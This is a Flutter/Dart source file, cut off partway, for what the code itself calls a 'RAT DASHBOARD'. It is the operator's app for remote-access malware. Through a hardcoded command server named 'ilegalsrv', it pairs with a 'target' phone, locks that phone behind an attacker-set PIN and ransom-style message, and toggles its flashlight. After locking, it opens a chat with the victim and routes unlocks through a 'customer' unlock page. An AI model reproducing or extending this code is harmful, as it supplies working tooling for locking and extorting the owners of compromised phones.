import 'dart:async';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:device_info_plus/device_info_plus.dart';
import 'package:url_launcher/url_launcher.dart';

// ─── Palette: Putih Cerah ─────────────────────────────────────────────────────
class _C {
  static const bg        = Color(0xFFF8FAFC);
  static const surface   = Color(0xFFFFFFFF);
  static const card      = Color(0xFFFFFFFF);
  static const cardAlt   = Color(0xFFF1F5F9);
  static const border    = Color(0xFFE2E8F0);
  static const borderLit = Color(0xFF2563EB);
  static const teal      = Color(0xFF0891B2);
  static const green     = Color(0xFF10B981);
  static const blue      = Color(0xFF2563EB);
  static const amber     = Color(0xFFF59E0B);
  static const red       = Color(0xFFDC2626);
  static const pink      = Color(0xFFEC4899);
  static const text      = Color(0xFF0F172A);
  static const textSub   = Color(0xFF475569);
  static const textDim   = Color(0xFF94A3B8);
}

// ─── Server Config ─────────────────────────────────────────────────────────────
class _Server {
  static const String baseUrl         = 'http://ilegalsrv-byzyro.r-cloud.my.id:25590';
  static const String pairEndpoint    = '/api/pair';
  static const String commandEndpoint = '/api/command';
  static const String statusEndpoint  = '/api/status';
  static const String chatSendEp      = '/api/chat/send';
  static const String chatGetEp       = '/api/chat/messages';
  static const String unlockPageUrl   = '$baseUrl/customer/unlock.html';
}

// ─── Command Model ─────────────────────────────────────────────────────────────
class _Cmd {
  final String id, label, endpoint, payload;
  final IconData icon;
  final Color color;
  const _Cmd({
    required this.id,
    required this.label,
    required this.endpoint,
    required this.icon,
    required this.color,
    required this.payload,
  });
}

// ─── Chat Message Model ───────────────────────────────────────────────────────
class _ChatMsg {
  final String id, sender, senderName, message;
  final int timestamp;
  _ChatMsg({
    required this.id,
    required this.sender,
    required this.senderName,
    required this.message,
    required this.timestamp,
  });

  factory _ChatMsg.fromJson(Map<String, dynamic> j) => _ChatMsg(
        id: j['id']?.toString() ?? '',
        sender: j['sender']?.toString() ?? 'target',
        senderName: j['senderName']?.toString() ?? 'Target',
        message: j['message']?.toString() ?? '',
        timestamp: (j['timestamp'] as num?)?.toInt() ?? 0,
      );
}

// ─── Device Dashboard Page ─────────────────────────────────────────────────────
class DeviceDashboard extends StatefulWidget {
  final String sessionKey;
  final String username;
  final String role;

  const DeviceDashboard({
    super.key,
    required this.sessionKey,
    required this.username,
    required this.role,
  });

  @override
  State<DeviceDashboard> createState() => _DeviceDashboardState();
}

class _DeviceDashboardState extends State<DeviceDashboard>
    with TickerProviderStateMixin {

  final TextEditingController _targetIdCtrl = TextEditingController();
  final TextEditingController _chatCtrl = TextEditingController();
  Timer? _pollTimer;
  Timer? _chatPoll;

  bool _isConnecting = false;
  bool _isConnected = false;
  bool _isLoading = false;
  String _pairingId = '';
  String _pairedTarget = '';
  String _deviceInfo = '';
  String _statusMessage = 'Belum terhubung';
  int _pollCount = 0;

  late AnimationController _pulseCtrl;
  late Animation<double> _pulse;
  late AnimationController _glowCtrl;

  // Chat state
  List<_ChatMsg> _chatMessages = [];
  int _lastChatTs = 0;
  bool _isChatOpen = false;
  int _unreadCount = 0;
  bool _hasNewChatNotification = false;
  final ScrollController _chatScroll = ScrollController();

  final List<_Cmd> _commands = const [
    _Cmd(id: 'lock', label: 'LOCK DEVICE', endpoint: '/api/command',
        icon: Icons.lock_rounded, color: _C.red,
        payload: '{"action":"lock"}'),
    _Cmd(id: 'unlock', label: 'UNLOCK', endpoint: '/api/command',
        icon: Icons.lock_open_rounded, color: _C.green,
        payload: '{"action":"unlock"}'),
    _Cmd(id: 'flashlight_on', label: 'SENTER ON', endpoint: '/api/command',
        icon: Icons.flashlight_on_rounded, color: _C.amber,
        payload: '{"action":"flashlight_on"}'),
    _Cmd(id: 'flashlight_off', label: 'SENTER OFF', endpoint: '/api/command',
        icon: Icons.flashlight_off_rounded, color: _C.textSub,
        payload: '{"action":"flashlight_off"}'),
  ];

  @override
  void initState() {
    super.initState();
    _pulseCtrl = AnimationController(
        vsync: this, duration: const Duration(seconds: 2))
      ..repeat(reverse: true);
    _pulse = Tween<double>(begin: 0.5, end: 1.0)
        .animate(CurvedAnimation(parent: _pulseCtrl, curve: Curves.easeInOut));
    _glowCtrl = AnimationController(
        vsync: this, duration: const Duration(seconds: 3))
      ..repeat(reverse: true);

    _generatePairingId();
    _loadDeviceInfo();
  }

  @override
  void dispose() {
    _targetIdCtrl.dispose();
    _chatCtrl.dispose();
    _pollTimer?.cancel();
    _chatPoll?.cancel();
    _pulseCtrl.dispose();
    _glowCtrl.dispose();
    _chatScroll.dispose();
    super.dispose();
  }

  void _generatePairingId() {
    final ts = DateTime.now().millisecondsSinceEpoch.toString();
    final rand = (ts.hashCode % 100000).toString().padLeft(5, '0');
    final key = widget.sessionKey.isNotEmpty && widget.sessionKey.length >= 4
        ? widget.sessionKey.substring(0, 4).toUpperCase()
        : 'ADMN';
    final id = 'RDX-$rand-$key';
    setState(() => _pairingId = id);
  }

  Future<void> _loadDeviceInfo() async {
    try {
      final info = await DeviceInfoPlugin().androidInfo;
      _deviceInfo = '${info.brand} ${info.model} | Android ${info.version.release}';
      if (mounted) setState(() {});
    } catch (_) {
      _deviceInfo = 'Unknown Device';
    }
  }

  // ── Pair Device ───────────────────────────────────────────────────────────
  Future<void> _pairDevice() async {
    final targetId = _targetIdCtrl.text.trim();
    if (targetId.isEmpty) {
      _showSnack('Masukkan Pairing ID target terlebih dahulu', _C.amber);
      return;
    }

    setState(() {
      _isConnecting = true;
      _statusMessage = 'Menghubungkan...';
    });

    try {
      final response = await http.post(
        Uri.parse('${_Server.baseUrl}${_Server.pairEndpoint}'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'sessionKey': widget.sessionKey,
          'username': widget.username,
          'pairingId': _pairingId,
          'targetId': targetId,
          'deviceInfo': _deviceInfo,
        }),
      ).timeout(const Duration(seconds: 10));

      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        if (data['success'] == true) {
          setState(() {
            _isConnected = true;
            _pairedTarget = targetId;
            _statusMessage = 'Terhubung ke $targetId';
          });
          _startPolling();
          _startChatPolling();
          _showSnack('Berhasil terhubung!', _C.green);
        } else {
          setState(() {
            _isConnected = false;
            _statusMessage = data['message'] ?? 'Pairing gagal';
          });
          _showSnack(_statusMessage, _C.red);
        }
      } else {
        setState(() {
          _isConnected = false;
          _statusMessage = 'Server error: ${response.statusCode}';
        });
        _showSnack('Server error ${response.statusCode}', _C.red);
      }
    } on TimeoutException {
      setState(() {
        _isConnected = false;
        _statusMessage = 'Timeout. Server tidak merespons.';
      });
      _showSnack('Koneksi timeout', _C.red);
    } catch (e) {
      setState(() {
        _isConnected = false;
        _statusMessage = 'Error: $e';
      });
      _showSnack('Gagal: $e', _C.red);
    } finally {
      if (mounted) setState(() => _isConnecting = false);
    }
  }

  // ── Polling Status ────────────────────────────────────────────────────────
  void _startPolling() {
    _pollTimer?.cancel();
    _pollTimer = Timer.periodic(const Duration(seconds: 5), (t) async {
      if (!_isConnected || !mounted) return;
      _pollCount++;
      try {
        final response = await http.get(
          Uri.parse('${_Server.baseUrl}${_Server.statusEndpoint}'
              '?pairingId=$_pairingId&target=$_pairedTarget'),
        ).timeout(const Duration(seconds: 5));
        if (response.statusCode == 200 && mounted) {
          final data = jsonDecode(response.body);
          setState(() {
            _statusMessage = data['status']?.toString() ??
                'Online (poll #$_pollCount)';
          });
        }
      } catch (_) {
        if (mounted) setState(() => _statusMessage = 'Koneksi terputus...');
      }
    });
  }

  // ── Send Command ──────────────────────────────────────────────────────────
  Future<void> _sendCommand(_Cmd cmd) async {
    if (!_isConnected) {
      _showSnack('Pairing dulu ke target device', _C.amber);
      return;
    }

    if (cmd.id == 'unlock') {
      await _openUnlockPage();
      return;
    }

    Map<String, String>? lockData;
    if (cmd.id == 'lock') {
      lockData = await _showLockDialog();
      if (lockData == null) return;
    }

    setState(() {
      _isLoading = true;
      _statusMessage = 'Mengirim ${cmd.label}...';
    });

    try {
      final payload = jsonDecode(cmd.payload);
      final body = <String, dynamic>{
        'sessionKey': widget.sessionKey,
        'pairingId': _pairingId,
        'targetId': _pairedTarget,
        'action': payload['action'],
      };

      if (cmd.id == 'lock' && lockData != null) {
        body['pin'] = lockData['pin'];
        body['message'] = lockData['message'];
      }

      final response = await http.post(
        Uri.parse('${_Server.baseUrl}${cmd.endpoint}'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode(body),
      ).timeout(const Duration(seconds: 10));

      if (response.statusCode == 200 && mounted) {
        _showSnack('${cmd.label} berhasil dikirim', cmd.color);
        setState(() => _statusMessage = '${cmd.label} terkirim');

        if (cmd.id == 'lock') {
          Future.delayed(const Duration(milliseconds: 500), () {
            if (mounted) {
              setState(() {
                _isChatOpen = true;
                _hasNewChatNotification = false;
                _unreadCount = 0;
              });
              _startChatPolling();
              _scrollChatToBottom();
              _showSnack('Chat panel dibuka', _C.teal);
            }
          });
        }
      } else {
        _showSnack('Gagal: ${response.statusCode}', _C.red);
      }
    } on TimeoutException {
      _showSnack('Timeout saat mengirim command', _C.red);
    } catch (e) {
      _showSnack('Error: $e', _C.red);
    } finally {
      if (mounted) setState(() => _isLoading = false);
    }
  }

  // ── Lock Dialog ───────────────────────────────────────────────────────────
  Future<Map<String, String>?> _showLockDialog() async {
    final pinCtrl = TextEditingController();
    final msgCtrl = TextEditingController(
        text: 'Perangkat ini terkunci oleh administrator.');
    final formKey = GlobalKey<FormState>();
    bool obscurePin = true;

    return showDialog<Map<String, String>>(
      context: context,
      barrierDismissible: false,
      builder: (ctx) => StatefulBuilder(
        builder: (ctx, setDialogState) => Dialog(
          backgroundColor: Colors.transparent,
          insetPadding: const EdgeInsets.symmetric(horizontal: 20),
          child: Container(
            decoration: BoxDecoration(
              color: _C.card,
              borderRadius: BorderRadius.circular(24),
              border: Border.all(color: _C.red.withOpacity(0.3), width: 1.5),
              boxShadow: [
                BoxShadow(
                    color: _C.red.withOpacity(0.15), blurRadius: 40)
              ],
            ),
            padding: const EdgeInsets.all(24),
            child: Form(
              key: formKey,
              child: Column(
                mainAxisSize: MainAxisSize.min,
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(
                    children: [
                      Container(
                        width: 48, height: 48,
                        decoration: BoxDecoration(
                          shape: BoxShape.circle,
                          color: _C.red.withOpacity(0.12),
                          border: Border.all(
                              color: _C.red.withOpacity(0.5), width: 1.5),
                        ),
                        child: const Icon(Icons.lock_rounded,
                            color: _C.red, size: 22),
                      ),
                      const SizedBox(width: 14),
                      const Expanded(
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Text(
                              'LOCK DEVICE',
                              style: TextStyle(
                                color: _C.text,
                                fontSize: 16,
                                fontWeight: FontWeight.w900,
                                letterSpacing: 1.5,
                              ),
                            ),
                            SizedBox(height: 3),
                            Text(
                              'Buat PIN & pesan untuk target',
                              style: TextStyle(
                                  color: _C.textSub, fontSize: 11),
                            ),
                          ],
                        ),
                      ),
                    ],
                  ),
                  const SizedBox(height: 20),
                  const Text(
                    'PIN UNLOCK (4-8 DIGIT)',
                    style: TextStyle(
                      color: _C.textSub, fontSize: 10,
                      fontWeight: FontWeight.w800, letterSpacing: 1.2,
                    ),
                  ),
                  const SizedBox(height: 8),
                  TextFormField(
                    controller: pinCtrl,
                    obscureText: obscurePin,
                    keyboardType: TextInputType.number,
                    maxLength: 8,
                    inputFormatters: [FilteringTextInputFormatter.digitsOnly],
                    style: const TextStyle(
                      color: _C.text, fontSize: 16,
                      fontWeight: FontWeight.w800, letterSpacing: 4,
                    ),
                    cursorColor: _C.red,
                    decoration: InputDecoration(
                      counterText: '',
                      hintText: '••••',
                      hintStyle: const TextStyle(
                          color: _C.textDim, letterSpacing: 4),
                      prefixIcon: const Icon(Icons.password_rounded,
                          color: _C.textSub, size: 18),
                      suffixIcon: IconButton(
                        icon: Icon(
                          obscurePin
                              ? Icons.visibility_off_outlined
                              : Icons.visibility_outlined,
                          color: _C.textSub, size: 18,
                        ),
                        onPressed: () => setDialogState(
                            () => obscurePin = !obscurePin),
                      ),
                      filled: true,
                      fillColor: _C.bg,
                      contentPadding: const EdgeInsets.symmetric(
                          horizontal: 14, vertical: 16),
                      enabledBorder: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(12),
                        borderSide:
                            BorderSide(color: _C.border),
                      ),
                      focusedBorder: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(12),
                        borderSide:
                            const BorderSide(color: _C.red, width: 1.5),
                      ),
                      errorBorder: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(12),
                        borderSide: const BorderSide(color: _C.red),
                      ),
                    ),
                    validator: (v) {
                      if (v == null || v.isEmpty) return 'PIN wajib diisi';
                      if (v.length < 4) return 'Minimal 4 digit';
                      if (!RegExp(r'^\d+$').hasMatch(v)) return 'Hanya angka';
                      return null;
                    },
                  ),
                  const SizedBox(height: 16),
                  const Text(
                    'PESAN UNTUK TARGET',
                    style: TextStyle(
                      color: _C.textSub, fontSize: 10,
                      fontWeight: FontWeight.w800, letterSpacing: 1.2,
                    ),
                  ),
                  const SizedBox(height: 8),
                  TextFormField(
                    controller: msgCtrl,
                    maxLines: 3,
                    maxLength: 200,
                    style: const TextStyle(
                        color: _C.text, fontSize: 12, height: 1.4),
                    cursorColor: _C.red,
                    decoration: InputDecoration(
                      counterStyle: const TextStyle(
                          color: _C.textDim, fontSize: 10),
                      hintText:
                          'Contoh: HP ini disita. Hubungi admin untuk unlock.',
                      hintStyle: const TextStyle(
                          color: _C.textDim, fontSize: 11),
                      prefixIcon: const Padding(
                        padding: EdgeInsets.only(bottom: 50),
                        child: Icon(Icons.message_rounded,
                            color: _C.textSub, size: 18),
                      ),
                      filled: true,
                      fillColor: _C.bg,
                      contentPadding: const EdgeInsets.all(14),
                      enabledBorder: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(12),
                        borderSide:
                            BorderSide(color: _C.border),
                      ),
                      focusedBorder: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(12),
                        borderSide:
                            const BorderSide(color: _C.red, width: 1.5),
                      ),
                    ),
                  ),
                  const SizedBox(height: 20),
                  Row(
                    children: [
                      Expanded(
                        child: SizedBox(
                          height: 46,
                          child: OutlinedButton(
                            onPressed: () => Navigator.pop(ctx),
                            style: OutlinedButton.styleFrom(
                              foregroundColor: _C.textSub,
                              side: BorderSide(color: _C.border),
                              shape: RoundedRectangleBorder(
                                borderRadius: BorderRadius.circular(12),
                              ),
                            ),
                            child: const Text(
                              'BATAL',
                              style: TextStyle(
                                fontSize: 12, fontWeight: FontWeight.w800,
                                letterSpacing: 1,
                              ),
                            ),
                          ),
                        ),
                      ),
                      const SizedBox(width: 10),
                      Expanded(
                        flex: 2,
                        child: SizedBox(
                          height: 46,
                          child: ElevatedButton(
                            onPressed: () {
                              if (formKey.currentState!.validate()) {
                                Navigator.pop(ctx, {
                                  'pin': pinCtrl.text.trim(),
                                  'message': msgCtrl.text.trim().isEmpty
                                      ? 'Perangkat ini terkunci oleh administrator.'
                                      : msgCtrl.text.trim(),
                                });
                              }
                            },
                            style: ElevatedButton.styleFrom(
                              backgroundColor: _C.red,
                              foregroundColor: Colors.white,
                              shape: RoundedRectangleBorder(
                                borderRadius: BorderRadius.circular(12),
                              ),
                              elevation: 0,
                            ),
                            child: const Row(
                              mainAxisAlignment: MainAxisAlignment.center,
                              children: [
                                Icon(Icons.lock_rounded, size: 16),
                                SizedBox(width: 6),
                                Text(
                                  'LOCK NOW',
                                  style: TextStyle(
                                    fontSize: 12, fontWeight: FontWeight.w900,
                                    letterSpacing: 1.5,
                                  ),
                                ),
                              ],
                            ),
                          ),
                        ),
                      ),
                    ],
                  ),
                ],
              ),
            ),
          ),
        ),
      ),
    );
  }

  // ── Open Unlock Page ──────────────────────────────────────────────────────
  Future<void> _openUnlockPage() async {
    final uri = Uri.tryParse(
        '${_Server.unlockPageUrl}?pairingId=$_pairingId&target=$_pairedTarget');
    if (uri == null) {
      _showSnack('URL unlock tidak valid', _C.red);
      return;
    }
    try {
      final launched =
          await launchUrl(uri, mode: LaunchMode.externalApplication);
      if (!launched) _showSnack('Tidak dapat membuka halaman unlock', _C.red);
    } catch (e) {
      _showSnack('Error: $e', _C.red);
    }
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // CHAT SYSTEM
  // ═══════════════════════════════════════════════════════════════════════════

  void _startChatPolling() {
    _chatPoll?.cancel();
    _fetchChatMessages();
    _chatPoll = Timer.periodic(const Duration(seconds: 3), (_) {
      _fetchChatMessages();
    });
  }

  Future<void> _fetchChatMessages() async {
    if (!_isConnected || _pairedTarget.isEmpty) return;
    try {
      final url = '${_Server.baseUrl}${_Server.chatGetEp}'
          '?pairingId=${Uri.encodeComponent(_pairingId)}'
          '&targetId=${Uri.encodeComponent(_pairedTarget)}'
          '${_lastChatTs > 0 ? '&since=$_lastChatTs' : ''}';
      final res = await http.get(Uri.parse(url))
          .timeout(const Duration(seconds: 5));
      if (res.statusCode == 200 && mounted) {
        final data = jsonDecode(res.body);
        final list = (data['messages'] as List?) ?? [];
        if (list.isNotEmpty) {
          bool hasNewFromTarget = false;
          setState(() {
            for (var item in list) {
              final msg = _ChatMsg.fromJson(item as Map<String, dynamic>);
              if (!_chatMessages.any((m) => m.id == msg.id)) {
                _chatMessages.add(msg);
                if (msg.timestamp > _lastChatTs) _lastChatTs = msg.timestamp;
                if (msg.sender == 'target' && !_isChatOpen) {
                  _unreadCount++;
                  hasNewFromTarget = true;
                  _hasNewChatNotification = true;
                }
              }
            }
            _chatMessages
                .sort((a, b) => a.timestamp.compareTo(b.timestamp));
          });

          if (hasNewFromTarget && _chatMessages.length == 1) {
            _showChatNotification();
          }
          _scrollChatToBottom();
        }
      }
    } catch (e) {
      debugPrint('Fetch chat error: $e');
    }
  }

  void _showChatNotification() {
    if (!mounted) return;
    HapticFeedback.mediumImpact();
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Row(
          children: [
            const Icon(Icons.chat_bubble_rounded,
                color: Colors.white, size: 18),
            const SizedBox(width: 10),
            Expanded(
              child: Column(
                mainAxisSize: MainAxisSize.min,
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  const Text(
                    'CHAT STARTED',
                    style: TextStyle(
                      fontWeight: FontWeight.w900,
                      fontSize: 12,
                      letterSpacing: 1,
                    ),
                  ),
                  Text(
                    'Target $_pairedTarget memulai chat',
                    style: const TextStyle(fontSize: 11),
                  ),
                ],
              ),
            ),
          ],
        ),
        backgroundColor: _C.teal,
        behavior: SnackBarBehavior.floating,
        duration: const Duration(seconds: 4),
        shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(12)),
        margin: const EdgeInsets.all(14),
        action: SnackBarAction(
          label: 'BUKA',
          textColor: Colors.white,
          onPressed: () {
            setState(() {
              _isChatOpen = true;
              _unreadCount = 0;
              _hasNewChatNotification = false;
            });
            _scrollChatToBottom();
          },
        ),
      ),
    );
  }

  Future<void> _sendAdminChat() async {
    final text = _chatCtrl.text.trim();
    if (text.isEmpty) return;
    if (!_isConnected || _pairedTarget.isEmpty) return;

    _chatCtrl.clear();
    final optimistic = _ChatMsg(
      id: 'local_${DateTime.now().millisecondsSinceEpoch}',
      sender: 'admin',
      senderName: 'Admin',
      message: text,
      timestamp: DateTime.now().millisecondsSinceEpoch,
    );
    setState(() => _chatMessages.add(optimistic));
    _scrollChatToBottom();

    try {
      await http.post(
        Uri.parse('${_Server.baseUrl}${_Server.chatSendEp}'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'pairingId': _pairingId,
          'targetId': _pairedTarget,
          'sender': 'admin',
          'senderName': 'Admin',
          'message': text,
        }),
      ).timeout(const Duration(seconds: 5));
      _fetchChatMessages();
    } catch (e) {
      _showSnack('Gagal kirim: $e', _C.red);
    }
  }

  void _scrollChatToBottom() {
    Future.delayed(const Duration(milliseconds: 150), () {
      if (_chatScroll.hasClients) {
        _chatScroll.animateTo(
          _chatScroll.position.maxScrollExtent,
          duration: const Duration(milliseconds: 300),
          curve: Curves.easeOut,
        );
      }
    });
  }

  // ── Snackbar ──────────────────────────────────────────────────────────────
  void _showSnack(String msg, Color color) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(msg, style: const TextStyle(fontWeight: FontWeight.w600)),
        backgroundColor: color,
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
        margin: const EdgeInsets.all(14),
        duration: const Duration(seconds: 2),
      ),
    );
  }

  void _disconnect() {
    _pollTimer?.cancel();
    _chatPoll?.cancel();
    setState(() {
      _isConnected = false;
      _pairedTarget = '';
      _statusMessage = 'Terputus';
      _pollCount = 0;
      _chatMessages = [];
      _lastChatTs = 0;
      _isChatOpen = false;
      _unreadCount = 0;
      _hasNewChatNotification = false;
    });
    _generatePairingId();
    _showSnack('Device diputuskan', _C.amber);
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // BUILD
  // ═══════════════════════════════════════════════════════════════════════════
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _C.bg,
      appBar: _buildAppBar(),
      body: SafeArea(
        child: Column(
          children: [
            Expanded(
              child: SingleChildScrollView(
                physics: const BouncingScrollPhysics(),
                padding: const EdgeInsets.fromLTRB(16, 16, 16, 16),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    _buildStatusCard(),
                    const SizedBox(height: 16),
                    _buildPairingCard(),
                    const SizedBox(height: 16),
                    _buildControlGrid(),
                    const SizedBox(height: 16),
                    _buildServerInfo(),
                    if (_isConnected) ...[
                      const SizedBox(height: 16),
                      _buildChatToggle(),
                    ],
                    const SizedBox(height: 12),
                  ],
                ),
              ),
            ),
            if (_isConnected)
              AnimatedContainer(
                duration: const Duration(milliseconds: 300),
                curve: Curves.easeOutCubic,
                height: _isChatOpen ? 360 : 0,
                child: _isChatOpen
                    ? _buildChatPanel()
                    : const SizedBox(),
              ),
          ],
        ),
      ),
    );
  }

  PreferredSizeWidget _buildAppBar() {
    return AppBar(
      backgroundColor: _C.surface,
      elevation: 0,
      shadowColor: _C.border,
      centerTitle: true,
      leading: IconButton(
        icon: const Icon(Icons.arrow_back_ios_new_rounded,
            color: _C.text, size: 18),
        onPressed: () => Navigator.pop(context),
      ),
      title: const Text(
        'RAT DASHBOARD',
        style: TextStyle(
          color: _C.text, fontSize: 14,
          fontWeight: FontWeight.w900, letterSpacing: 2.5,
        ),
      ),
      actions: [
        if (_isConnected)
          IconButton(
            icon: const Icon(Icons.link_off_rounded, color: _C.red, size: 20),
            onPressed: _disconnect,
          ),
        const SizedBox(width: 4),
      ],
      bottom: PreferredSize(
        preferredSize: const Size.fromHeight(1),
        child: Container(height: 1, color: _C.border),
      ),
    );
  }

  // ── Status Card ───────────────────────────────────────────────────────────
  Widget _buildStatusCard() {
    final statusColor = _isConnected ? _C.green : _C.red;
    return Container(
      width: double.infinity,
      padding: const EdgeInsets.all(18),
      decoration: BoxDecoration(
        color: _C.card,
        borderRadius: BorderRadius.circular(18),
        border: Border.all(
            color: statusColor.withOpacity(0.5), width: 1.5),
        boxShadow: [
          BoxShadow(
            color: statusColor.withOpacity(0.15),
            blurRadius: 20,
          ),
        ],
      ),
      child: Row(
        children: [
          AnimatedBuilder(
            animation: _pulse,
            builder: (_, __) => Container(
              width: 54, height: 54,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                color: statusColor.withOpacity(0.15),
                border: Border.all(
                  color: statusColor.withOpacity(_pulse.value),
                  width: 2,
                ),
                boxShadow: [
                  BoxShadow(
                    color: statusColor.withOpacity(_pulse.value * 0.4),
                    blurRadius: 15,
                  )
                ],
              ),
              child: Icon(
                _isConnected
                    ? Icons.sensors_rounded
                    : Icons.sensors_off_rounded,
                color: statusColor, size: 24,
              ),
            ),
          ),
          const SizedBox(width: 14),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  _isConnected ? 'TERHUBUNG' : 'TIDAK TERHUBUNG',
                  style: TextStyle(
                    color: statusColor,
                    fontSize: 15,
                    fontWeight: FontWeight.w900,
                    letterSpacing: 1.5,
                  ),
                ),
                const SizedBox(height: 4),
                Text(
                  _statusMessage,
                  style: const TextStyle(
                      color: _C.textSub, fontSize: 11, height: 1.4),
                  maxLines: 2,
                  overflow: TextOverflow.ellipsis,
                ),
                if (_isConnected) ...[
                  const SizedBox(height: 4),
                  Row(
                    children: [
                      const Icon(Icons.my_location_rounded,
                          color: _C.teal, size: 11),
                      const SizedBox(width: 4),
                      Text(
                        'Target: $_pairedTarget',
                        style: const TextStyle(
                          color: _C.teal, fontSize: 10,
                          fontWeight: FontWeight.w700,
                        ),
                      ),
                    ],
                  ),
                ],
              ],
            ),
          ),
        ],
      ),
    );
  }

  // ── Pairing Card ──────────────────────────────────────────────────────────
  Widget _buildPairingCard() {
    return Container(
      width: double.infinity,
      padding: const EdgeInsets.all(18),
      decoration: BoxDecoration(
        color: _C.card,
        borderRadius: BorderRadius.circular(18),
        border: Border.all(color: _C.border, width: 1.2),
        boxShadow: [
          BoxShadow(color: _C.text.withOpacity(0.05), blurRadius: 12)
        ],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Container(
                padding: const EdgeInsets.all(7),
                decoration: BoxDecoration(
                  color: _C.teal.withOpacity(0.12),
                  borderRadius: BorderRadius.circular(8),
                ),
                child: const Icon(Icons.qr_code_2_rounded,
                    color: _C.teal, size: 16),
              ),
              const SizedBox(width: 10),
              const Text(
                'PAIRING DEVICE',
                style: TextStyle(
                  color: _C.text, fontSize: 13,
                  fontWeight: FontWeight.w900, letterSpacing: 1.5,
                ),
              ),
            ],
          ),
          const SizedBox(height: 16),
          const Text(
            'PAIRING ID KAMU (otomatis)',
            style: TextStyle(
              color: _C.textSub, fontSize: 10,
              fontWeight: FontWeight.w800, letterSpacing: 1.2,
            ),
          ),
          const SizedBox(height: 8),
          Container(
            width: double.infinity,
            padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 14),
            decoration: BoxDecoration(
              color: _C.bg,
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: _C.teal.withOpacity(0.3), width: 1.2),
            ),
            child: Row(
              children: [
                Expanded(
                  child: Text(
                    _pairingId,
                    style: const TextStyle(
                      color: _C.teal, fontSize: 15,
                      fontWeight: FontWeight.w900, letterSpacing: 2,
                      fontFamily: 'monospace',
                    ),
                  ),
                ),
                GestureDetector(
                  onTap: () {
                    Clipboard.setData(ClipboardData(text: _pairingId));
                    _showSnack('Pairing ID disalin', _C.green);
                  },
                  child: const Icon(Icons.copy_rounded,
                      color: _C.textSub, size: 18),
                ),
              ],
            ),
          ),
          const SizedBox(height: 16),
          const Text(
            'PAIRING ID TARGET',
            style: TextStyle(
              color: _C.textSub, fontSize: 10,
              fontWeight: FontWeight.w800, letterSpacing: 1.2,
            ),
          ),
          const SizedBox(height: 8),
          TextField(
            controller: _targetIdCtrl,
            style: const TextStyle(
              color: _C.text, fontSize: 13,
              fontWeight: FontWeight.w700, letterSpacing: 1,
            ),
            cursorColor: _C.teal,
            decoration: InputDecoration(
              hintText: 'Masukkan ID device target',
              hintStyle: const TextStyle(
                  color: _C.textDim, fontSize: 12),
              prefixIcon: const Icon(Icons.phonelink_setup_rounded,
                  color: _C.textSub, size: 18),
              filled: true,
              fillColor: _C.bg,
              contentPadding: const EdgeInsets.symmetric(
                  horizontal: 14, vertical: 16),
              enabledBorder: OutlineInputBorder(
                borderRadius: BorderRadius.circular(12),
                borderSide: BorderSide(color: _C.border),
              ),
              focusedBorder: OutlineInputBorder(
                borderRadius: BorderRadius.circular(12),
                borderSide: const BorderSide(color: _C.teal, width: 1.5),
              ),
            ),
          ),
          const SizedBox(height: 16),
          SizedBox(
            width: double.infinity,
            height: 50,
            child: ElevatedButton(
              onPressed: _isConnecting ? null : _pairDevice,
              style: ElevatedButton.styleFrom(
                backgroundColor: _isConnected ? _C.cardAlt : _C.teal,
                foregroundColor: _isConnected ? _C.text : Colors.white,
                shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(12),
                ),
                elevation: 0,
              ),
              child: _isConnecting
                  ? const SizedBox(
                      width: 20, height: 20,
                      child: CircularProgressIndicator(
                        color: Colors.white, strokeWidth: 2.5,
                      ),
                    )
                  : Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        Icon(
                          _isConnected
                              ? Icons.check_circle_rounded
                              : Icons.link_rounded,
                          size: 20,
                        ),
                        const SizedBox(width: 8),
                        Text(
                          _isConnected ? 'TERHUBUNG' : 'HUBUNGKAN',
                          style: const TextStyle(
                            fontSize: 13,
                            fontWeight: FontWeight.w900,
                            letterSpacing: 1.5,
                          ),
                        ),
                      ],
                    ),
            ),
          ),
        ],
      ),
    );
  }

  // ── Control Grid ──────────────────────────────────────────────────────────
  Widget _buildControlGrid() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Padding(
          padding: const EdgeInsets.only(left: 4, bottom: 12),
          child: Row(
            children: [
              Container(
                width: 6, height: 6,
                decoration: BoxDecoration(
                  shape: BoxShape.circle, color: _C.red,
                ),
              ),
              const SizedBox(width: 8),
              const Text(
                'REMOTE CONTROL',
                style: TextStyle(
                  color: _C.text, fontSize: 12,
                  fontWeight: FontWeight.w900, letterSpacing: 2,
                ),
              ),
            ],
          ),
        ),
        GridView.builder(
          shrinkWrap: true,
          physics: const NeverScrollableScrollPhysics(),
          gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
            crossAxisCount: 2,
            crossAxisSpacing: 12,
